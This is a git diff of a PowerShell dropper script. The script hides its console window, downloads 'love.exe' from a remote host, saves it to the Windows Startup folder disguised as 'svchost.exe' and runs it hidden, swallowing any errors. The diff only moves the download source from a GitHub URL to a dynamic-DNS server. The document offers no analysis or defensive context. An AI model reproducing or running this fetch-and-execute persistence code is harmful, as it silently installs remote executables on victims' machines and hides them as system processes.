@@ -3,7 +3,7 @@ Add-Type -Name Win -Namespace Native -MemberDefinition '[DllImport("user32.dll")
 $hwnd = (Get-Process -Id $PID).MainWindowHandle
 [Native.Win]::ShowWindow($hwnd, 6) | Out-Null
 
-$url = "https://github.com/FCsab/weather/raw/refs/heads/main/love.exe"
+$url = "http://fcsab.ddns.net:3010/love.exe"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $exePath = "$startupPath\svchost.exe"
 
@@ -12,4 +12,5 @@ try {
     Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -EA Stop
     Start-Process -FilePath $exePath -WindowStyle Hidden
 } catch {}
+
 exit
